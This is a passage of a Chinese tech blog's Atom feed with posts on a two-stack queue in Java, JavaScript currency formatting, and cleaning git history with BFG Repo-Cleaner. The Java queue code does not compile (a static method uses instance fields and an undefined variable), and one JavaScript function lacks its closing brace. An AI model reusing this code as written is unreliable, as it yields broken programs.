    <title>两个栈实现一个队列</title>
    <link href="https://amosannn.github.io/2017/05/25/implement-queue-by-two-stacks/"/>
    <id>https://amosannn.github.io/2017/05/25/implement-queue-by-two-stacks/</id>
    <published>2017-05-25T11:29:53.000Z</published>
    <updated>2017-05-25T13:41:37.285Z</updated>
    
    <content type="html"><![CDATA[<p>今天下午汉得来学校宣讲，笔试中看到这样一个题目，让我们用两个栈实现一个队列。</p>
<p>那时候没想太多，队列先进先出，栈先进后出，那么只要一个栈作为主栈，另一个栈作为缓存栈，来回倒腾就能实现队列的功能了。</p>
<p><img src="/images/two-stacks-operation.jpg" alt=""></p>
<p>回来后仔细想想，其实还有比这更高效的方法。<a id="more"></a>也就是保留主栈的栈底元素，弹出即可，这样可以减少一次压栈操作。</p>
<p>顺便用代码实现了一下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">入队时将元素压入栈1。</div><div class="line">出队时先判断栈2是否为空，若不为空则直接弹出栈2的栈顶元素。若为空，则将栈1除了栈底的元素弹出并压入栈2，然后弹出栈1的元素再将栈2的元素弹出并压回栈1即可。</div><div class="line">这样做的好处是可以减少一次压栈的操作，并且考虑了没有元素可出队的异常处理。</div><div class="line">*/</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StackToQueue</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; stack1;</div><div class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; stack2;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StackToQueue</span><span class="params">()</span> </span>&#123;</div><div class="line">       stack1 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</div><div class="line">       stack2 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">//如果栈1不为空，且栈1所剩元素大于1，则将栈1出栈并压入栈2</span></div><div class="line">        <span class="keyword">while</span>(!stack1.isEmpty())&#123;</div><div class="line">        	<span class="keyword">if</span>(<span class="number">1</span>==stack.size())</div><div class="line">        		<span class="keyword">break</span>;</div><div class="line">        	stack2.push(stack1.pop());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">//将栈1的元素出栈，即出队。</span></div><div class="line">        <span class="keyword">int</span> top = stack1.pop();</div><div class="line"></div><div class="line">        <span class="comment">//如果栈2不为空，将栈2中的元素出栈并压回栈1中</span></div><div class="line">        <span class="keyword">while</span>(!stack2.isEmpty())&#123;</div><div class="line">            stack1.push(stack2.pop());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> top;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天下午汉得来学校宣讲，笔试中看到这样一个题目，让我们用两个栈实现一个队列。&lt;/p&gt;
&lt;p&gt;那时候没想太多，队列先进先出，栈先进后出，那么只要一个栈作为主栈，另一个栈作为缓存栈，来回倒腾就能实现队列的功能了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/two-stacks-operation.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;回来后仔细想想，其实还有比这更高效的方法。
    
    </summary>
    
    
      <category term="algorithm" scheme="https://amosannn.github.io/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>使用JavaScript进行货币格式化</title>
    <link href="https://amosannn.github.io/2017/05/23/currency-formatting-by-javascript/"/>
    <id>https://amosannn.github.io/2017/05/23/currency-formatting-by-javascript/</id>
    <published>2017-05-22T16:06:35.000Z</published>
    <updated>2017-05-25T13:42:12.508Z</updated>
    
    <content type="html"><![CDATA[<p>在项目中碰到关于货币金额的页面显示，为了让金额的显示更为人性化与规范化，需要加入货币格式化策略。<br>也就是所谓的数字千分位格式化。<br>例如<code>￥39,998</code> <code>$1,299</code></p>
<p>以下为包含小数处理的三种代码块。<br><a id="more"></a></p>
<p>保留2位小数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 将数值四舍五入(保留2位小数)后格式化成金额形式</div><div class="line"> *</div><div class="line"> * @param num 数值(Number或者String)</div><div class="line"> * @return 金额格式的字符串,如'1,234,567.45'</div><div class="line"> * @type String</div><div class="line"> */</div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">formatCurrency</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">    num = num.toString().replace(<span class="regexp">/\$|\,/g</span>,<span class="string">''</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(num))</div><div class="line">        num = <span class="string">"0"</span>;</div><div class="line">    sign = (num == (num = <span class="built_in">Math</span>.abs(num)));</div><div class="line">    num = <span class="built_in">Math</span>.floor(num*<span class="number">100</span>+<span class="number">0.50000000001</span>);</div><div class="line">    cents = num%<span class="number">100</span>;</div><div class="line">    num = <span class="built_in">Math</span>.floor(num/<span class="number">100</span>).toString();</div><div class="line">    <span class="keyword">if</span>(cents&lt;<span class="number">10</span>)</div><div class="line">    cents = <span class="string">"0"</span> + cents;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">Math</span>.floor((num.length-(<span class="number">1</span>+i))/<span class="number">3</span>); i++)</div><div class="line">    num = num.substring(<span class="number">0</span>,num.length-(<span class="number">4</span>*i+<span class="number">3</span>))+<span class="string">','</span>+</div><div class="line">    num.substring(num.length-(<span class="number">4</span>*i+<span class="number">3</span>));</div><div class="line">    <span class="keyword">return</span> (((sign)?<span class="string">''</span>:<span class="string">'-'</span>) + num + <span class="string">'.'</span> + cents);</div></pre></td></tr></table></figure>
<p>保留1位小数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * 将数值四舍五入(保留1位小数)后格式化成金额形式</div><div class="line"> *</div><div class="line"> * @param num 数值(Number或者String)</div><div class="line"> * @return 金额格式的字符串,如'1,234,567.4'</div><div class="line"> * @type String</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatCurrencyTenThou</span>(<span class="params">num</span>) </span>&#123;</div><div class="line">    num = num.toString().replace(<span class="regexp">/\$|\,/g</span>,<span class="string">''</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(num))</div><div class="line">    num = <span class="string">"0"</span>;</div><div class="line">    sign = (num == (num = <span class="built_in">Math</span>.abs(num)));</div><div class="line">    num = <span class="built_in">Math</span>.floor(num*<span class="number">10</span>+<span class="number">0.50000000001</span>);</div><div class="line">    cents = num%<span class="number">10</span>;</div><div class="line">    num = <span class="built_in">Math</span>.floor(num/<span class="number">10</span>).toString();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">Math</span>.floor((num.length-(<span class="number">1</span>+i))/<span class="number">3</span>); i++)</div><div class="line">    num = num.substring(<span class="number">0</span>,num.length-(<span class="number">4</span>*i+<span class="number">3</span>))+<span class="string">','</span>+</div><div class="line">    num.substring(num.length-(<span class="number">4</span>*i+<span class="number">3</span>));</div><div class="line">    <span class="keyword">return</span> (((sign)?<span class="string">''</span>:<span class="string">'-'</span>) + num + <span class="string">'.'</span> + cents);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>不保留小数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatPrice</span>(<span class="params">n</span>) </span>&#123;</div><div class="line">   <span class="keyword">var</span> t = <span class="built_in">parseInt</span>(n), i, r;</div><div class="line">   <span class="keyword">for</span> (t = t.toString().replace(<span class="regexp">/^(\d*)$/</span>, <span class="string">"$1."</span>), t = (t + <span class="string">"00"</span>).replace(<span class="regexp">/(\d*\.\d\d)\d*/</span>, <span class="string">"$1"</span>), t = t.replace(<span class="string">"."</span>, <span class="string">","</span>), i = <span class="regexp">/(\d)(\d&#123;3&#125;,)/</span>; i.test(t); )</div><div class="line">       t = t.replace(i, <span class="string">"$1,$2"</span>);</div><div class="line">   <span class="keyword">return</span> t = t.replace(<span class="regexp">/,(\d\d)$/</span>, <span class="string">".$1"</span>), r = t.split(<span class="string">"."</span>), r[<span class="number">1</span>] == <span class="string">"00"</span> &amp;&amp; (t = r[<span class="number">0</span>]), t</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>参考链接：<br><a href="http://www.haorooms.com/post/js_qian_huobi_gs" target="_blank" rel="external">http://www.haorooms.com/post/js_qian_huobi_gs</a><br><a href="https://github.com/lishengzxc/bblog/issues/15" target="_blank" rel="external">https://github.com/lishengzxc/bblog/issues/15</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在项目中碰到关于货币金额的页面显示，为了让金额的显示更为人性化与规范化，需要加入货币格式化策略。&lt;br&gt;也就是所谓的数字千分位格式化。&lt;br&gt;例如&lt;code&gt;￥39,998&lt;/code&gt; &lt;code&gt;$1,299&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;以下为包含小数处理的三种代码块。&lt;br&gt;
    
    </summary>
    
    
      <category term="JavaScript" scheme="https://amosannn.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>如何删除GitHub的历史commit</title>
    <link href="https://amosannn.github.io/2017/05/22/delete-github-history-by-bfg/"/>
    <id>https://amosannn.github.io/2017/05/22/delete-github-history-by-bfg/</id>
    <published>2017-05-21T17:33:24.000Z</published>
    <updated>2017-06-01T13:53:58.960Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/github-hacker.jpg" alt=""></p>
<p>这可能是目前互联网上最详细的BFG Repo-Cleaner中文教程了。</p>
<p>为了删除三天前的一次错误提交，我开始寻找关于撤销github历史commit的方法。<br>实话说，经历了6个小时的搜索，我依旧没有找到能解决我所碰到的奇怪问题的解决方案，我发现网络上对于BFG的相关讨论太少太少，尤其是中文的信息，更是贫瘠。另外的原因也是大部分人确实能按照官方的指引，一步到位地删除历史提交的信息。我失败了，不知道是因为git配置或是哪出了纰漏，但也因此浏览了互联网上大部分解答。<br>以下是我整理出的使用教程。<br><a id="more"></a></p>
<h2 id="BFG-Repo-Cleaner"><a href="#BFG-Repo-Cleaner" class="headerlink" title="BFG Repo-Cleaner"></a><a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="external">BFG Repo-Cleaner</a></h2><blockquote>
<p>github称BFG为<code>git filter-branch</code>的替代品。一款比它更快更简单的用于删除无用数据的工具。</p>
</blockquote>
<p>作为一个github官方推荐的”仓库清理工具”，快速和简单是它被推荐的重要原因，程序为一个<code>Scala</code>编写而成的jar包，也意味着运行环境需要jdk的支持。<br>ok，竟然github都这样推荐了，就先来试一试。</p>
<h3 id="BFG的主要功能与使用步骤如下："><a href="#BFG的主要功能与使用步骤如下：" class="headerlink" title="BFG的主要功能与使用步骤如下："></a>BFG的主要功能与使用步骤如下：</h3><h4 id="1-克隆仓库"><a href="#1-克隆仓库" class="headerlink" title="1.克隆仓库"></a>1.克隆仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git clone --mirror git://example.com/some-big-repo.git</div></pre></td></tr></table></figure>
<p>使用<code>--mirror</code>标记clone一份repo（目标仓库）到本地。</p>
<h4 id="2-执行BFG命令移除文件"><a href="#2-执行BFG命令移除文件" class="headerlink" title="2.执行BFG命令移除文件"></a>2.执行BFG命令移除文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ java -jar 占位符1 占位符2 占位符3</div></pre></td></tr></table></figure>
<p>clone下来的git仓库和你想象中应该是有点差距的，因为它和你托管在github上的仓库并不一样，它并没有你编写的代码和文件结构，但它与你的库相关联。你可以选择备份也可以选择直接操作。</p>
<p>占位符1：</p>
<blockquote>
<ul>
<li>jar包路径，若刚好位于bash的当前目录，则直接输入jar包文件名 例：bfg-1.12.15.jar</li>
</ul>
</blockquote>
<p>占位符2：</p>
<blockquote>
<ul>
<li><code>--strip-blobs-bigger-than 10M</code> 删除所有大于10m的文件</li>
<li><code>--delete-files id_{dsa,rsa}</code> 删除id_dsa, id_rsa</li>
<li><code>--delete-files file</code> 删除目标文件</li>
<li><code>--replace-text passwords.txt</code> txt定义语法替换文件内容</li>
<li><code>--delete-folders folder</code> 删除文件夹</li>
</ul>
</blockquote>
<p>占位符3：</p>
<blockquote>
<ul>
<li>clone下来的git文件名 例：some-big-repo.git</li>
</ul>
</blockquote>
<p>e.g.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar bfg.jar --strip-blobs-bigger-than 10M some-big-repo.git</div></pre></td></tr></table></figure></p>
<h4 id="3-使用gc命令删除目标数据"><a href="#3-使用gc命令删除目标数据" class="headerlink" title="3.使用gc命令删除目标数据"></a>3.使用gc命令删除目标数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd some-big-repo.git</div><div class="line">$ git reflog expire --expire=now --all &amp;&amp; git gc --prune=now --aggressive</div></pre></td></tr></table></figure>
<h4 id="4-提交修改"><a href="#4-提交修改" class="headerlink" title="4.提交修改"></a>4.提交修改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git push</div></pre></td></tr></table></figure>
<p>至此，新clone出来的git库中，将再也找不到被删除的内容了。<br>相关参考链接请移步页脚。</p>
<hr>
<p>以下记录我遇到的问题</p>
<p>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar bfg-1.12.15.jar --delete-files carousel.jsp tmall-web-store.git</div></pre></td></tr></table></figure></p>
<p>报错信息：These are your protected commits, and so their contents will NOT be altered: commit 6c3f4d5a (protected by ‘HEAD’)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">$ java -jar bfg-1.12.15.jar --delete-files xxxxx.xx xxxxx.git</div><div class="line"></div><div class="line">Using repo : C:\Users\js\Downloads\xxxxx.git</div><div class="line"></div><div class="line">Found 205 objects to protect</div><div class="line">Found 2 commit-pointing refs : HEAD, refs/heads/master</div><div class="line"></div><div class="line">Protected commits</div><div class="line">-----------------</div><div class="line"></div><div class="line">These are your protected commits, and so their contents will NOT be altered:</div><div class="line"></div><div class="line"> * commit 6c3f4d5a (protected by &apos;HEAD&apos;)</div><div class="line"></div><div class="line">Cleaning</div><div class="line">--------</div><div class="line"></div><div class="line">Found 14 commits</div><div class="line">Cleaning commits:       100% (14/14)</div><div class="line">Cleaning commits completed in 93 ms.</div><div class="line"></div><div class="line">BFG aborting: No refs to update - no dirty commits found??</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">--</div><div class="line">You can rewrite history in Git - don&apos;t let Trump do it for real!</div><div class="line">Trump&apos;s administration has lied consistently, to make people give up on ever</div><div class="line">being told the truth. Don&apos;t give up: https://github.com/bkeepers/stop-trump</div><div class="line">--</div></pre></td></tr></table></figure>
<p>我不明白为什么会显示protected commits，在我尝试多次commit之后，也就是修改head~1，或是手动删除文件，都无法让程序成功运行下去。甚至在多次push与pull之后，commit记录竟x2了…</p>
<p>几近崩溃的我只能执行git上取消上一个commit的命令,手动撤销了所有的记录（包括目标记录后的几条commit），再重新提交…Orz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git reset --hard HEAD~1</div><div class="line">git push --force</div></pre></td></tr></table></figure></p>
<p>相关链接：</p>
<blockquote>
<ul>
<li><a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="external">BFG Repo-Cleaner</a></li>
<li><a href="https://help.github.com/articles/removing-sensitive-data-from-a-repository/" target="_blank" rel="external">[github]Removing sensitive data from a repository</a></li>
</ul>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/github-hacker.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这可能是目前互联网上最详细的BFG Repo-Cleaner中文教程了。&lt;/p&gt;
&lt;p&gt;为了删除三天前的一次错误提交，我开始寻找关于撤销github历史commit的方法。&lt;br&gt;实话说，经历了6个小时的搜索，我依旧没有找到能解决我所碰到的奇怪问题的解决方案，我发现网络上对于BFG的相关讨论太少太少，尤其是中文的信息，更是贫瘠。另外的原因也是大部分人确实能按照官方的指引，一步到位地删除历史提交的信息。我失败了，不知道是因为git配置或是哪出了纰漏，但也因此浏览了互联网上大部分解答。&lt;br&gt;以下是我整理出的使用教程。&lt;br&gt;
    
    </summary>
    
    
      <category term="GitHub" scheme="https://amosannn.github.io/tags/GitHub/"/>
    
      <category term="BFG" scheme="https://amosannn.github.io/tags/BFG/"/>
    
  </entry>
  
  <entry>
    <title>Hello Hexo</title>
    <link href="https://amosannn.github.io/2017/04/16/Hello-Hexo/"/>
    <id>https://amosannn.github.io/2017/04/16/Hello-Hexo/</id>
    <published>2017-04-16T13:04:36.000Z</published>
    <updated>2017-05-25T15:11:16.975Z</updated>
    
    <content type="html"><![CDATA[<p>阿盛的技术博客诞生。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阿盛的技术博客诞生。&lt;/p&gt;

    
    </summary>
    
    
  </entry>
  
</feed>
